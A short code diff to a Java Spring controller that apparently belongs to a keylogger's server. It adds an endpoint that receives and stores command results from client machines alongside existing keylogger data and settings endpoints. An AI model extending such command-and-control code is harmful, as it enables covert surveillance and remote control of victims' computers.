@@ -1,5 +1,6 @@
 package com.klg.client.controller;
 
+import com.klg.client.model.CommandResponseRequest;
 import com.klg.client.model.KeyloggerData;
 import com.klg.client.model.SettingsResponse;
 import com.klg.client.model.SyncedCommandResponse;
@@ -31,5 +32,10 @@ public class ClientController {
   @GetMapping("/settings")
   public SettingsResponse getSettings() {
     return clientService.settings();
+  }
+
+  @PostMapping("/cmd_res")
+  public void saveCommandResponse(@RequestBody CommandResponseRequest request) {
+    clientService.saveResponse(request);
   }
 }
